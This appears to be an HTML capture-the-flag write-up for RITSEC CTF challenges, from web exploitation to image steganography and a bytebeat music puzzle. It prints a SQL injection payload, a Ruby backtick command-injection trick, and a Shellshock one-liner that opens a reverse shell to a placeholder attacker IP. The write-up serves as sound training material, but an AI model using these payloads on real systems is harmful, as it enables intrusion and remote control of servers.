@@ -1,0 +1,118 @@
+<html>
+
+<head>
+    <title>❄️🌸</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css?family=Fira+Mono');
+
+        body {
+            width: 512px;
+            margin: 32px auto;
+            font-family: Fira Mono;
+            line-height: 1.5;
+        }
+
+        a {
+            text-decoration: none;
+            color: #174ba6;
+        }
+
+        a:hover {
+            text-decoration: underline;
+            text-decoration-color: #f7c6ff;
+        }
+
+        pre {
+            padding: 0.5em 1em;
+            margin: 0.5em;
+            white-space: pre-wrap;
+            background: black;
+            color: white;
+        }
+
+        code {
+            padding: 0.15em 1em;
+            display: inline-block;
+            background: black;
+            color: white;
+        }
+
+        li {
+            margin-bottom: 1em;
+        }
+
+        blockquote {
+            background: #f0f0f0;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>ritctf</h1>
+    <a href="https://ctf.ritsec.club">ctf.ritsec.club</a>
+    <h2>space force</h2>
+    <p>standard sql injection vulnerability. <code>' OR 1=1 OR 1='</code> yields flag (as do other inputs).</p>
+    <h2>the tangled web</h2>
+    <p>big web of pages linking to each other. first step is to download all pages using wget. then grep for flag.</p>
+    <p>we find link to <code>Fl4gggg1337.html</code>, which says</p>
+    <blockquote>
+        &lt;p style=&quot;color: white&quot;&gt;Ha you thought there would be a flag here? Nice try :)&lt;/p&gt;
+        &lt;p style=&quot;color: white&quot;&gt;Maybe next time &lt;a href=&quot;Stars.html&quot; style=&quot;color: white; text-decoration: none&quot;&gt;!&lt;/a&gt;&lt;/p&gt;
+    </blockquote>
+    <p>so we check <code>Stars.html</code> to get base64 encoded flag</p>
+    <h2>crazy train</h2>
+    <p>fake blogging site with form to create post. reading source shows it's a ruby on rails app.</p>
+    <p>testing create post form, we find unused input field. if we set value of this field to ruby shellcode injection like <code>`echo "hello"`</code> (URI encoded of course) then server responds with result of our command.</p>
+    <p>at this point you can just cat flag.txt from the folder</p>
+    <h2>cute dog</h2>
+    <p>this one is single page with embedded result of <code>cgi-bin/stats</code> binary showing page states.</p>
+    <p>the page says dog is "shockingly" cute, hint for shellshock-style vulnerability. so we can copy and paste shellshock example and have executable code</p>
+    <p>however, flag location is not in current directory, need to hunt for it. so take a little extra time to set up a reverse shell:</p>
+    <code>
+        wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/dash -i >& /dev/tcp/ATTACK_SERVER_IP/80 0>&1 " http://fun.ritsec.club:8008/cgi-bin/stats
+        </code>
+    <p>once we have shell we can just:</p>
+    <pre>grep --exclude-dir=dev --exclude-dir=sys --exclude-dir=proc -ir RITSEC /</pre>
+    <p>to find flag in <code>/opt/flag.txt</code></p>
+    <h2>cool filter</h2>
+    <p>challenge is image of dinosaur. viewing in GIMP we see blue channel has repeating pattern, other channels normal.</p>
+    <p>next step is to open the image in python and try to decode each blue channel value as ascii. doesn't work at first but we try a few different rotations:</p>
+    <pre>
+#!/usr/bin/env python
+import numpy as np
+import skimage.io as io
+
+im = io.imread("CheckOutThisFilter.png")
+
+print("".join([chr(x) for x in im[0,:100,2]]))
+key = im[0,:128,2].astype(np.uint8)
+def stri(k):
+    return "".join([chr(x) for x in k])
+
+for i in range(-78,117):
+    print(i, "\t->\t", stri(key + i))
+        </pre>
+    <p>rot19 yields the flag</p>
+    <h2>music</h2>
+    <p>another image with text in it. this time each channel has different periodicity (r with period 32, g with period 38, d with period 66)</p>
+    <p>taking the first <period> pixels of each channel and rendering them as ascii, we get a function in three parts:</p>
+    <p>r: <code>(t<<3)*[8/9,1,9/8,6/5,4/3,3/2,0]</code></p>
+
+    <p>g: <code>[[0xd2d2c7,0xce4087,0xca32c7,0x8e4008]</code></p>
+
+    <p>b: <code>[t>>14&3.1]>>(0x3dbe4687>>((t>>10&15)>9?18:t>>10&15)*3&7.1)*3&7.1]</code></p>
+
+    <p>assembling them in rgb order (the only order that yields a valid function), we get:</p>
+
+    <pre>
+        (t<<3)*[8/9,1,9/8,6/5,4/3,3/2,0][[0xd2d2c7,0xce4087,0xca32c7,0x8e4008][t>>14&3.1]>>(0x3dbe4687>>((t>>10&15)>9?18:t>>10&15)*3&7.1)*3&7.1]
+        </pre>
+    <p>ignoring the leading (t&lt;&lt;3)*, the function is structured as a list of 7 fractions and a complicated access pattern dependent on a free variable t</p>
+    <p>bearing the name of the challenge in mind, each fraction probably represents a musical note within a scale; 1 is the tonic, 3/2 is perfect fifth, and so on (see [the table on wikipedia](https://en.wikipedia.org/wiki/Interval_(music))). the
+        only non-obvious fractions are 8/9 and 0. taken as a literally, 8/9 would be the minor 7th of octave below the root (a minor 7th in the same octave would be 16/9). 0 is probably a rest (silence).</p>
+    <p>so by iterating t (time) and evaluating the function at each point, we should retrieve a sequence of notes and rests corresponding to the intervals of a melody.</p>
+    <p><a href="music">we can translate the code to js and play it</a></p>
+    <p>we use name of song in flag format as flag</p>
+</body>
+
+</html>
